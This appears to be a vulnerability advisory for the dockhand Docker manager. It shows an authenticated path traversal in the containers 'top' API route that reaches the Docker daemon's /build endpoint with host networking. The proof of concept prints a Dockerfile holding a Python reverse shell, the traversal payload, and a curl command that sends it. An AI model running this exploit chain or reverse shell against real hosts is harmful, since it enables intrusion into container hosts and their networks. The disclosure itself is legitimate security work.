-----------------

### Authenticated Server Side Path Traversal to Container Creation to Sandboxed RCE with Host Network Access

------------------

### Summary
A vulnerability exists in `dockhand-main/src/routes/api/containers/[id]/top/+server.ts` allowIng an attacker to pass unsanitized values(../) as `params.id` which is passed to ` execInContainer` in `dockhand-main/src/lib/server/docker.ts` .This allows an attacker to move up the route, call docker endpoint `/build` to build a malicious container with full host network access allowing an attacker to map the entire host network which creates a new attack surface for attackers
### Details
- Code ` dockhand-main/src/routes/api/containers/[id]/top/+server.ts`, params.id gets passed to the function without getting filtered allowing an attacker to pass `../` to move up an endpoint to load a sensitive endpoint-:

```typescript
//LIne 52
//api /containers/[id]/top
const output = await execInContainer(params.id, cmd, envIdNum);
				// Check if output looks like an error message (BusyBox error, etc.)
				if (output.includes('unrecognized option') || output.includes('Usage:') || output.includes('BusyBox')) {
					continue;
				}
```
-  Gadget `execInContainer` in `dockhand-main/src/lib/server/docker.ts`, The point stated above is widespread over the code but I picked this function because `/build` requires `POST` http method to get loaded which is used in the function..-:

```typescript
//line 3247
export async function execInContainer(
	containerId: string,
	cmd: string[],
	envId?: number | null
): Promise<string> {
	// Create exec instance
	const execCreate = await dockerJsonRequest<{ Id: string }>(
		`/containers/${containerId}/exec`,
		{
			method: 'POST',
			body: JSON.stringify({
				Cmd: cmd,
				AttachStdout: true,
				AttachStderr: true,
				Tty: false
			})
		},
		envId
	);
```

- `/build` route in docker daemon api allows users to build container from a remote url with the `remote` parameter along with the `networkMode` parameter set to `host` which grants full host network access.  It reduces the impact but in some machine docker daemon might be exposed on `localhost:2375` which can allow an attacker to build malicious container and breakout as root serving as a Privilege Escalation vector. [Docker docs](https://docs.docker.com/reference/api/engine/version/v1.48/#tag/Image/operation/ImageBuild)-:

<img width="1521" height="869" alt="image" src="https://github.com/user-attachments/assets/864fed9a-875e-4452-836a-902814add95a" />

### PoC
- Host this dockerfile on a vps or github repository.It creates a sandboxed alpine image and sends a reverse shell to the target host
> python3 -m http.server 8000

```dockerfile
FROM alpine:latest

RUN apk add --no-cache curl jq python3 bash

RUN python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("<ip>",8000));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("bash")'
```
- I urlencoded the payload to prevent misinterpration of http characters. Original payload-:

```txt
../build?remote=http://<url>/Dockerfile&t=sweptme:latest&networkmode=host&version=1#/top
```
- Using curl-:

```bash
curl --path-as-is http://<url>/api/containers/%2e%2e%2fbuild%3fremote=<url urlencoded>%26t=sweptme:latest%26networkmode=host%26version=1%23/top?env=1
```
<img width="1906" height="104" alt="image" src="https://github.com/user-attachments/assets/008e8b19-8424-4939-972a-06b3fe63ee39" />

- SSRF-:

<img width="678" height="113" alt="image" src="https://github.com/user-attachments/assets/b80c337b-ca69-42c7-b66f-1826438907a0" />

- Reverse Shell-:

<img width="546" height="105" alt="image" src="https://github.com/user-attachments/assets/132d0ca2-b04e-493b-ac6b-3e42fb04ef20" />

- Full host network access allowing mitm attacks-:

<img width="1331" height="974" alt="image" src="https://github.com/user-attachments/assets/5b2463e3-c8ed-48cf-8769-011188bd5ca9" />

- Accessing the http server created earlier from the sandbox-:

<img width="851" height="761" alt="image" src="https://github.com/user-attachments/assets/9da475bf-b703-4d8d-857a-5acaf8730eb2" />


### Impact
- MITM attacks
- RCE if docker daemon is exposed on  the host network
